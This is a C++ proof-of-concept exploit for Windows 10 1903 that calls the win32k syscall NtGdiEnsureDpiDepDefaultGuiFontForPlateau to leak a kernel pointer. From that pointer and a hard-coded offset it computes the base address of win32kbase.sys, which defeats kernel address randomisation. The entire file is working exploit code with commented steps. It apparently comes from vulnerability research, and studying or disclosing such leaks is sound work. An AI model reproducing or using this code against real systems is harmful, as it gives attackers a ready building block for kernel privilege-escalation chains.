#include <iostream>
#include <Windows.h>

// Definition was manually reversed. You can however find the header definitions at https://github.com/ir0nc0w/cross-compile_for_Windows/blob/c2db5c35e04f5c45f87a2592504466b70b1bc5e4/SDK10/include/um/ntgdi.h#L2625
typedef LONG64(WINAPI* NtGdiEnsureDpiDepDefaultGuiFontForPlateau)(int iDpi);

// Definition taken from https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntifs/nf-ntifs-ntallocatevirtualmemory
typedef NTSTATUS(WINAPI* NtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

int main()
{
	printf("NtGdiEnsureDpiDepDefaultGuiFontForPlateau Exploit\r\n");
	printf("Author: Grant Willcox of VS-Labs Research Team\r\n");
	printf("-----------------------------------------------\r\n");

	// Need to load gdi32.dll or user32.dll. Loading either one will allow one to make the call to 
	// NtGdiEnsureDpiDepDefaultGuiFontForPlateau without raising an error within ntdll.dll.
	HMODULE hGDI32 = LoadLibraryA("gdi32.dll");
	if (hGDI32 == NULL) {
		printf("[!] Was unable to load gdi32.dll into memory!\r\n");
		printf("[!] Error was: 0x%08x\r\n", GetLastError());
		return -1;
	}

	// Initialize the pointer to the function we want to call, aka the pfnNtGdiEnsureDpiDepDefaultGuiFontForPlateau, to NULL
	NtGdiEnsureDpiDepDefaultGuiFontForPlateau pfnNtGdiEnsureDpiDepDefaultGuiFontForPlateau = NULL;

	// Call LoadLibrary() to load win32u.dll, which exports the function NtGdiEnsureDpiDepDefaultGuiFontForPlateau, 
	// which is a wrapper that performs a syscall to NtGdiEnsureDpiDepDefaultGuiFontForPlateau in win32kfull.sys.
	HMODULE win32Handle = LoadLibrary(L"win32u.dll");
	if (win32Handle == NULL) {
		printf("[!] Was unable to load win32u.dll into memory!\r\n");
		printf("[!] Error was: 0x%08x\r\n", GetLastError());
		return -2;
	}

	// Call GetProcAddress to get the address of NtGdiEnsureDpiDepDefaultGuiFontForPlateau within win32u.dll.
	// Then save this address into pfnNtGdiEnsureDpiDepDefaultGuiFontForPlateau.
	pfnNtGdiEnsureDpiDepDefaultGuiFontForPlateau = (NtGdiEnsureDpiDepDefaultGuiFontForPlateau)GetProcAddress(win32Handle, "NtGdiEnsureDpiDepDefaultGuiFontForPlateau");
	if (pfnNtGdiEnsureDpiDepDefaultGuiFontForPlateau == NULL) {
		printf("[!] Was unable to find the address of the exported function NtGdiEnsureDpiDepDefaultGuiFontForPlateau within win32u.dll!\r\n");
		printf("[!] Error was: 0x%08x\r\n", GetLastError());
		return -3;
	}

	// Extra call made here to ensure that the memory for the check is populated so that the next call takes the right path.
	// This only really needs to be done once per boot of the machine, but we do it twice in this program to ensure the exploit always succeeds.
	pfnNtGdiEnsureDpiDepDefaultGuiFontForPlateau(0x00000000000001E0);

	// Now make the call again, which should result in the call succeeding
	LONG64 rawReturnedAddress = pfnNtGdiEnsureDpiDepDefaultGuiFontForPlateau(0x00000000000001E0);

	// Print out returned information.
	printf("[*] win32kbase!gahDpiDepDefaultGuiFonts address: 0x%llx\r\n", rawReturnedAddress);
	LONG64 baseAddressOfWin32kBase = rawReturnedAddress - 0x215A20; // 0x215A20 is the case for Windows 10 1903 x64 with October 2019 patches applied. Different versions may have different offsets. Atm I don't have a way to remove this file level dependency.
	printf("[*] win32kbase.sys has been loaded into memory at: 0x%llx\r\n", baseAddressOfWin32kBase);
	return 0;
}
